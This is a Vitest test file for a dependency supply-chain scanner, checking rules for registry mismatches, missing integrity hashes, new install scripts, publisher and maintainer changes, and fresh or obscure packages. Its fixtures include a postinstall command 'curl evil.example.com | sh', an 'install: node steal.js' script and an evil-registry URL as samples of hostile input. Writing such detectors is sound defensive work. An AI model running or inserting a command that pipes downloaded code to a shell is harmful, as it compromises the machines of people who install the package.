import { afterEach, describe, expect, it, vi } from 'vitest';
import deprecated from '../../src/rules/deprecated';
import installScriptAdded from '../../src/rules/install-script-added';
import integrityMissing from '../../src/rules/integrity-missing';
import maintainersChanged from '../../src/rules/maintainers-changed';
import newObscureTransitive from '../../src/rules/new-obscure-transitive';
import newTransitive from '../../src/rules/new-transitive';
import newYoungTransitive from '../../src/rules/new-young-transitive';
import publisherChanged from '../../src/rules/publisher-changed';
import registryMismatch from '../../src/rules/registry-mismatch';
import versionTooFresh from '../../src/rules/version-too-fresh';
import { added, bumped, config, pkg } from '../helpers';

const NPM = 'https://registry.npmjs.org';
const allowlist = config({ registries: [NPM] });

afterEach(() => vi.useRealTimers());

describe('registry-mismatch', () => {
    it('fires when a resolution leaves the allowlist', () => {
        const result = registryMismatch.check(
            added({ resolved: 'https://evil-registry.example.com/x.tgz' }),
            allowlist
        );

        expect(result?.evidence).toBe(
            `resolves to https://evil-registry.example.com, not to ${NPM}`
        );
    });

    it('accepts a mirror that the base lockfile already used', () => {
        const mirror = config({ registries: [NPM, 'https://npm.internal.example.com'] });

        expect(
            registryMismatch.check(
                added({ resolved: 'https://npm.internal.example.com/x.tgz' }),
                mirror
            )
        ).toBeNull();
    });

    it('accepts a mirror served under a path prefix, and only that path', () => {
        const artifactory = 'https://art.example.com/artifactory/api/npm/npm-local';
        const mirrored = config({ registries: [NPM, artifactory] });

        expect(
            registryMismatch.check(
                added({ resolved: `${artifactory}/left-pad/-/left-pad-1.3.0.tgz` }),
                mirrored
            )
        ).toBeNull();
        expect(
            registryMismatch.check(
                added({ resolved: `${artifactory}-staging/left-pad/-/left-pad-1.3.0.tgz` }),
                mirrored
            )?.evidence
        ).toContain('resolves to https://art.example.com/artifactory/api/npm/npm-local-staging');
    });

    it('reports a git resolution, which is not a registry at all', () => {
        expect(
            registryMismatch.check(
                added({ resolved: 'git+ssh://git@github.com/acme/x.git#0f9e8d7' }),
                allowlist
            )?.evidence
        ).toContain('git+ssh://github.com');
    });

    it('says nothing about a removal or an unparsable resolution', () => {
        expect(
            registryMismatch.check(
                { change: { kind: 'removed', pkg: pkg() }, base: null, head: null },
                allowlist
            )
        ).toBeNull();
        expect(registryMismatch.check(added({ resolved: undefined }), allowlist)).toBeNull();
        expect(registryMismatch.check(added({ resolved: 'nonsense' }), allowlist)).toBeNull();
    });
});

describe('integrity-missing', () => {
    it('fires on a registry tarball with no hash', () => {
        expect(
            integrityMissing.check(added({ integrity: undefined }), allowlist)?.evidence
        ).toMatch(/no integrity hash for https/);
    });

    it('fires when nothing at all was recorded', () => {
        expect(
            integrityMissing.check(added({ integrity: undefined, resolved: undefined }), allowlist)
                ?.evidence
        ).toBe('no integrity hash recorded');
    });

    it('stays quiet for a git dependency, which never has one', () => {
        expect(
            integrityMissing.check(
                added({ integrity: undefined, resolved: 'git+ssh://git@github.com/a/b.git#sha' }),
                allowlist
            )
        ).toBeNull();
    });

    it('stays quiet when the hash is there, and for removals', () => {
        expect(integrityMissing.check(added(), allowlist)).toBeNull();
        expect(
            integrityMissing.check(
                {
                    change: { kind: 'removed', pkg: pkg({ integrity: undefined }) },
                    base: null,
                    head: null,
                },
                allowlist
            )
        ).toBeNull();
    });
});

describe('new-transitive', () => {
    it('fires only for a transitive addition', () => {
        expect(newTransitive.check(added({ direct: false }), allowlist)?.evidence).toContain(
            'node_modules/left-pad'
        );
        expect(newTransitive.check(added({ direct: true }), allowlist)).toBeNull();
        expect(newTransitive.check(bumped({}, { direct: false }), allowlist)).toBeNull();
    });
});

describe('install-script-added', () => {
    it('quotes the command, not the fact that a command exists', () => {
        const change = bumped(
            { version: '0.24.0' },
            { version: '0.25.0' },
            { scripts: {} },
            { scripts: { postinstall: 'node install.js', test: 'vitest' } }
        );

        expect(installScriptAdded.check(change, allowlist)?.evidence).toBe(
            'postinstall: node install.js'
        );
    });

    it('fires when an existing script changed its command', () => {
        const change = bumped(
            {},
            {},
            { scripts: { postinstall: 'node install.js' } },
            { scripts: { postinstall: 'curl evil.example.com | sh' } }
        );

        expect(installScriptAdded.check(change, allowlist)?.evidence).toBe(
            'postinstall: curl evil.example.com | sh'
        );
    });

    it('stays quiet when the same script was already there', () => {
        const scripts = { preinstall: 'node build.js' };

        expect(
            installScriptAdded.check(bumped({}, {}, { scripts }, { scripts }), allowlist)
        ).toBeNull();
    });

    it('fires for a new package that arrives with one', () => {
        expect(
            installScriptAdded.check(
                added({ name: 'evil' }, { scripts: { install: 'node steal.js' } }),
                allowlist
            )?.evidence
        ).toBe('install: node steal.js');
    });

    it('needs metadata to say anything', () => {
        expect(installScriptAdded.check(added({}, null), allowlist)).toBeNull();
        expect(
            installScriptAdded.check(
                { change: { kind: 'removed', pkg: pkg() }, base: null, head: {} },
                allowlist
            )
        ).toBeNull();
    });
});

describe('publisher-changed', () => {
    it('names both accounts', () => {
        const change = bumped({}, {}, { npmUser: 'dominictarr' }, { npmUser: 'right9ctrl' });

        expect(publisherChanged.check(change, allowlist)?.evidence).toBe(
            'published by right9ctrl, previous version by dominictarr'
        );
    });

    it('stays quiet on the same publisher, a missing one, or an addition', () => {
        expect(
            publisherChanged.check(bumped({}, {}, { npmUser: 'a' }, { npmUser: 'a' }), allowlist)
        ).toBeNull();
        expect(publisherChanged.check(bumped({}, {}, {}, { npmUser: 'a' }), allowlist)).toBeNull();
        expect(publisherChanged.check(added({}, { npmUser: 'a' }), allowlist)).toBeNull();
    });
});

describe('maintainers-changed', () => {
    it('separates a lost owner from a gained collaborator', () => {
        const change = bumped(
            {},
            {},
            { maintainers: ['dominictarr'] },
            { maintainers: ['right9ctrl'] }
        );

        expect(maintainersChanged.check(change, allowlist)?.evidence).toBe(
            'no longer maintained by dominictarr; now also maintained by right9ctrl'
        );
        expect(
            maintainersChanged.check(
                bumped({}, {}, { maintainers: ['a'] }, { maintainers: ['a', 'b'] }),
                allowlist
            )?.evidence
        ).toBe('now also maintained by b');
    });

    it('stays quiet on an unchanged or unknown list', () => {
        expect(
            maintainersChanged.check(
                bumped({}, {}, { maintainers: ['a'] }, { maintainers: ['a'] }),
                allowlist
            )
        ).toBeNull();
        expect(
            maintainersChanged.check(bumped({}, {}, {}, { maintainers: ['a'] }), allowlist)
        ).toBeNull();
        expect(maintainersChanged.check(added({}, { maintainers: ['a'] }), allowlist)).toBeNull();
    });
});

describe('version-too-fresh', () => {
    it('reports the age in minutes when it is under an hour', () => {
        vi.useFakeTimers();
        vi.setSystemTime(Date.parse('2026-09-04T12:00:00Z'));

        expect(
            versionTooFresh.check(added({}, { publishedAt: '2026-09-04T11:30:00Z' }), allowlist)
                ?.evidence
        ).toBe('published 30m ago (2026-09-04T11:30:00Z), threshold is 24h');
    });

    it('reports the age in hours otherwise, and respects the threshold', () => {
        vi.useFakeTimers();
        vi.setSystemTime(Date.parse('2026-09-04T12:00:00Z'));

        expect(
            versionTooFresh.check(added({}, { publishedAt: '2026-09-04T00:00:00Z' }), allowlist)
                ?.evidence
        ).toContain('published 12h ago');
        expect(
            versionTooFresh.check(
                added({}, { publishedAt: '2026-09-04T00:00:00Z' }),
                config({ freshnessHours: 6 })
            )
        ).toBeNull();
    });

    it('stays quiet without a date, or with one it cannot read', () => {
        expect(versionTooFresh.check(added({}, {}), allowlist)).toBeNull();
        expect(versionTooFresh.check(added({}, { publishedAt: 'nope' }), allowlist)).toBeNull();
    });
});

describe('deprecated', () => {
    it('quotes the deprecation message', () => {
        expect(
            deprecated.check(added({}, { deprecated: 'use v2 instead' }), allowlist)?.evidence
        ).toBe('deprecated: use v2 instead');
    });

    it('stays quiet otherwise', () => {
        expect(deprecated.check(added({}, { deprecated: false }), allowlist)).toBeNull();
        expect(deprecated.check(added({}, { deprecated: '' }), allowlist)).toBeNull();
        expect(deprecated.check(added({}, null), allowlist)).toBeNull();
        expect(
            deprecated.check(
                { change: { kind: 'removed', pkg: pkg() }, base: null, head: { deprecated: 'x' } },
                allowlist
            )
        ).toBeNull();
    });
});

describe('new-obscure-transitive', () => {
    it('fires below the threshold only', () => {
        expect(
            newObscureTransitive.check(added({ direct: false }, { weeklyDownloads: 3 }), allowlist)
                ?.evidence
        ).toBe('3 downloads last week, threshold is 100');
        expect(
            newObscureTransitive.check(
                added({ direct: false }, { weeklyDownloads: 500 }),
                allowlist
            )
        ).toBeNull();
        expect(
            newObscureTransitive.check(added({ direct: true }, { weeklyDownloads: 3 }), allowlist)
        ).toBeNull();
        expect(newObscureTransitive.check(added({ direct: false }, {}), allowlist)).toBeNull();
    });
});

describe('new-young-transitive', () => {
    it('fires for a package first published inside the window', () => {
        vi.useFakeTimers();
        vi.setSystemTime(Date.parse('2026-09-04T12:00:00Z'));

        expect(
            newYoungTransitive.check(
                added({ direct: false }, { firstPublishedAt: '2026-09-01T12:00:00Z' }),
                config({ strictAge: true })
            )?.evidence
        ).toBe('first published 3d ago (2026-09-01T12:00:00Z), threshold is 30d');
    });

    it('stays quiet for an old package, a direct one, or an unreadable date', () => {
        vi.useFakeTimers();
        vi.setSystemTime(Date.parse('2026-09-04T12:00:00Z'));

        const strict = config({ strictAge: true });

        expect(
            newYoungTransitive.check(
                added({ direct: false }, { firstPublishedAt: '2020-01-01T00:00:00Z' }),
                strict
            )
        ).toBeNull();
        expect(
            newYoungTransitive.check(
                added({ direct: true }, { firstPublishedAt: '2026-09-01T12:00:00Z' }),
                strict
            )
        ).toBeNull();
        expect(
            newYoungTransitive.check(added({ direct: false }, { firstPublishedAt: 'nope' }), strict)
        ).toBeNull();
        expect(newYoungTransitive.check(added({ direct: false }, {}), strict)).toBeNull();
    });
});
